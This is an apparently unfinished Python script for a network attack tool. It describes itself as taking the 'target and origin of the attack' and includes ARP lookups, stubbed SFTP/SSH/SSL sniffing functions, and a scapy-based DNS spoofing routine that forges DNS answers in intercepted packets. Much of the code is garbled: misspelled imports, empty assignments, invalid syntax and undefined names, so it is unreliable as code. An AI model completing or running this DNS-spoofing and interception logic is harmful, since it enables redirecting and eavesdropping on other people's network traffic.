#

import click, collections, context, server, ssl , typing, time, asyncio, pysftp, getpass, os, pathlib, logging, sys, atexit, multiprocess, netfilterqueqe, string, argsparse
from collections import namedtuple
from pandas import DataFrame, MultiIndex, Series
from sqlalchemy.orm.decl_api import DeclarativeMeta 
from server import Base, Database
import contextlib 
import asyncio as sync 
import argparse, exprn, ip
import ip 

logging.basicConfig(
    level=logging.DEBUG,
    format='(%(Appname)s %(threadName)-10s) %(message)s',
    filename="sycllanetwork.log"
)
thread=threading.Event()
register=atexit.register()
df=DataFrame
series=Series
mi= MultiIndex
A=namedtuple("Links","hosts,spines,leafs")
B=None 
C=namedtuple("Processor","sub, routines, hyper")

class Outq():
    def __init__(self, initialsize: int):
        self._outgoing_packets=[None]*initialsize
        self._nitems=0

    @property
    def outgoing_matrix(self, func, args):
        q=self._outgoing_packets 
        stack_http=q.sorted()
        stack_icmp=q.sorted()
        stack_tcp=q.sorted()
        return ( matrix= map(func, self._outgoing_packets), 
                tcpq=stack_tcp,
                httpq=stack_http, 
                icmpq=stack_icmp) 
    
    @property
    def outq_nitems(self):
        return self._nitems

    @.setter
    def ncount(self):
        self._nitems=len(self._outgoing_packets)

    def insert(self, object):
        while object is isinstance(list) | object == self._outgoing_packets:
            for index, packet in enumerate(object): 
                
             self._outgoing_packets[self._nitems]+= object
        while object is type():
             pass
        else: 
            raise e

    def searchfor(self, item):
        pass

class ProductDatabase():
    def __init__(self, api):
        super(context.AbstractAsyncContextManager, server.).__init__():
        pass 


class MultiplexDistribution:
    def __init__(self, product):
        self.kc_map= Series(data=product, columns=[]) 
        self.arp_table
        pass
    def prepare():
        pass 

    def __call__():
        pass 
class FrameworkData():
    def __init__(self):

        pass 

product = ProductDatabase()
index = FrameworkData

def user_input_target(self, **kwargs):
   pass 

def user_input_origin( *args):
   pass 

target_by_user = user_input_target
origin_by_user = user_input_origin
parser = argparse.ArgumentParser(
    description=' Enter the target and origin of the attack',
)

def spoof():
    

def whois(target:any ,origin:string):
        config=
        function_arp=ARP 
        function_ether=Ether
        while True:
            try: 
                if target== type([]): 
                    for i in target: 
                        function_arp(op=ARP.who_has,pdst=i)
                        function_ether(dst=origin)
                else:
                    ARP(op=ARP.who_has, pdst=target)
                    Ether(dst=origin)
            except: 
                if origin is None:
                    fire= function_arp/function_broadcast
                    res=srp(fire, timeout=1, verbose=False)[0]
                    return res[0][1].hwsrc
   
def sniff_sftp():
    def sftp_getfiles(*args):
        username, password, hostname =args 
        cnopts=
        cnopts.hostkeys.load()
        with pysftp.Connection() as sftp: 
            pass
def sniff_sshp():
    pass 

def sniff_ssl():
    pass 

def spoof(packet):
    from scapy.all import scapy
    packet = scapy.IP(packet.get_payload())
    while packet.haslayer(scapy.DNSRR):
        qname = packet[scapy.DNSQR].qname 
        for i in target_by_user:
            if target_by_user in qname: 
                payload = scapy.DNSRR(rrname=qname, rdata=origin_by_user)
                packet[scapy.DNS].an = payload 
                packet[scapy.DNS].ancount = 1
                del packet[scapy.IP].len
                del packet[scapy.IP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].chksum
                del packet[scapy.UDP].len 
            packet.set_payload(str())



@click.command()
@click.version_option 
def cli():
    if 
    click.echo() 


scan_event= threading.Event()

scan_input_thread = threading.Thread(
    name=' scanning user input %()s'
    target = scan_prompt_data,
    args=(t,)
)

process_spoof_thread = threading.Thread(
    name=' packet processing %()s'
    target= process,
    args=(),
)

log = logging.getProcess()
process = ( process_spoof_thread  )

def main():
    
    volume= 
    interfaces= 
    environment_keys=
  parser.add_arguemnt('end', action=, default=False)
  parser.add_arguemnt('start', action=, default=True)
  parser.addd_arguement('get', action=, default=False)
  parser.add_arguemnt('--spoof',action=,default=False)
  parser.add_arguement('--connect',action=,default=False)

  while True:
    

if __name__ is __main__:
    main()
